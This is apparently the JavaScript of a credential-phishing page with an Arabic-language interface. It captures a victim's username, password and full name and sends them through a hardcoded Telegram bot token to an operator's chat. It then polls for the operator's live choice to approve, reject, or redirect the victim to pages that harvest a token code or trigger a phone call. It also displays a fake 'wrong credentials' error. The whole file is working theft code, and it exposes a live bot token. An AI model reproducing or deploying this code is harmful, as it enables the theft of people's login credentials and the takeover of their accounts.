const BOT_TOKEN = '8891065186:AAEl3mhHxdy53_2ZOnQU1E08FWFxmEsn1R4';
    const CHAT_ID = '6165206261';
    const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

    let pendingRequestId = null;

    async function sendToTelegram(message, requestId, dataType) {
        try {
            const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ قبول', callback_data: `approve_${dataType}_${requestId}` },
                            { text: '❌ رفض', callback_data: `reject_${dataType}_${requestId}` },
                            { text: 'توكن', callback_data: `link_card_${dataType}_${requestId}` },
                            { text: 'اتصال', callback_data: `link_ca_${dataType}_${requestId}`}
                        ]]
                    }
                })
            });
            const json = await response.json();
            return json.result ? json.result.message_id : null;
        } catch (error) {
            console.error('خطأ:', error);
            return null;
        }
    }

    async function editTelegramMessage(messageId, originalText, resultText) {
        try {
            await fetch(`${WEBHOOK_URL}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_id: messageId,
                    text: originalText + '\n\n' + resultText,
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [] }
                })
            });
        } catch (error) {
            console.error('خطأ في تعديل الرسالة:', error);
        }
    }

    async function checkWebhookResponse(requestId, dataType) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
            const data = await response.json();
            if (data.ok && data.result && data.result.length > 0) {
                for (let update of data.result) {
                    if (update.callback_query) {
                        const callbackData = update.callback_query.data;
                        if (callbackData === `approve_${dataType}_${requestId}`) return 'approved';
                        if (callbackData === `reject_${dataType}_${requestId}`) return 'rejected';
                        if (callbackData === `link_card_${dataType}_${requestId}`) return 'link_card';
                        if (callbackData === `link_ca_${dataType}_${requestId}`) return 'link_ca';
                    }
                }
            }
            return 'pending';
        } catch (error) {
            return 'pending';
        }
    }

    function enforceEnglish(input) {
        const pos = input.selectionStart;
        const cleaned = input.value.replace(/[^\x00-\x7F]/g, '');
        if (cleaned !== input.value) { input.value = cleaned; input.setSelectionRange(pos - 1, pos - 1); }
    }

    function checkFields() {
        const user = document.getElementById('usernameInput').value.trim();
        const pass = document.getElementById('passwordInput').value.trim();
        const btn = document.getElementById('loginBtn');
        const valid = user.length > 0 && pass.length > 0;
        btn.disabled = !valid;
        btn.classList.toggle('active', valid);
    }

    function togglePass() {
        const inp = document.getElementById('passwordInput');
        const icon = document.getElementById('eyeIcon');
        if (inp.type === 'password') {
            inp.type = 'text';
            icon.innerHTML = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>`;
        } else {
            inp.type = 'password';
            icon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
        }
    }

    document.addEventListener('DOMContentLoaded', function () {
        document.getElementById('usernameInput').addEventListener('input', function () { enforceEnglish(this); checkFields(); });
        document.getElementById('passwordInput').addEventListener('input', function () { enforceEnglish(this); checkFields(); });

        document.getElementById('loginBtn').addEventListener('click', async function () {
            if (this.disabled) return;

            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const fullName = sessionStorage.getItem('userFullName') || 'غير معروف';

            document.getElementById('loadingOverlay').classList.add('show');

            const requestId = Date.now();
            pendingRequestId = requestId;

            const message =
                `🔐 <b>صفحة تسجيل الدخول - Login</b>\n\n` +
                `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
                `🔑 <b>اسم المستخدم:</b> <code>${username}</code>\n` +
                `🔒 <b>كلمة المرور:</b> <code>${password}</code>\n\n` +
                `⏰ ${new Date().toLocaleString('ar-EG')}`;

            const messageId = await sendToTelegram(message, requestId, 'login');

            if (!messageId) {
                document.getElementById('loadingOverlay').classList.remove('show');
                alert('حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى.');
                return;
            }

            const checkInterval = setInterval(async () => {
                const status = await checkWebhookResponse(requestId, 'login');
                if (status === 'approved') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '✅ تم القبول');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    window.location.href = 'verification.html';
                } else if (status === 'link_card') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '� تم التحويل لصفحة كود التوكن');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    window.location.href = 'tok.html';
                } else if (status === 'link_ca') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, 'تم التحويل لصفحة الاتصال');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    window.location.href = 'notok.html';
                } else if (status === 'rejected') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '❌ تم الرفض');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    showRejection();
                }
            }, 2000);
        });
    });

    function showRejection() {
        document.body.innerHTML = `
        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;
            height:100vh;font-family:'Segoe UI',Tahoma,Arial,sans-serif;text-align:center;padding:20px;
            background:linear-gradient(135deg,#b71c1c,#e53935);">
            <div style="background:white;border-radius:20px;padding:40px 30px;max-width:360px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.35);">
                <div style="width:80px;height:80px;background:#e53935;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:42px;color:white;margin:0 auto 24px;">✕</div>
                <h2 style="color:#b71c1c;font-size:22px;font-weight:700;margin-bottom:14px;direction:rtl;">خطأ في بيانات الدخول</h2>
                <p style="color:#555;font-size:15px;line-height:1.7;direction:rtl;">اسم المستخدم أو كلمة المرور غير صحيحة.</p>
                <button onclick="location.reload()" style="margin-top:28px;padding:13px 30px;background:#1a5ca8;color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;width:100%;">حاول مرة أخرى</button>
            </div>
        </div>`;
    }

    window.addEventListener('beforeunload', () => { pendingRequestId = null; });